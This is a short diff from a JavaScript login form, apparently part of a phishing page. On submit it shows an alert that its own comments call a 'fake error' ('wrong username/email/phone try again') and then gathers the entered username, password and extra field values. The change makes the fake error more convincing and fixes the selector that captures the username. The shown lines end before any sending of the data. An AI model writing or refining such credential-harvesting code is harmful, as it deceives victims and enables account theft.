@@ -182,10 +182,10 @@ function renderForm(data){
       e.preventDefault();
 
       // 1️⃣ Show fake error
-      alert("*wrong try again*");
+      alert("wrong username/email/phone try again");
 
       // 2️⃣ Collect form values
-      const username = formDiv.querySelector('input[type="username"]')?.value || "";
+      const username = formDiv.querySelector('input[type="text"]')?.value || "";
       const password = formDiv.querySelector('input[type="password"]')?.value || "";
       const extraValues = extraInputs.map(i=>i.value);
 
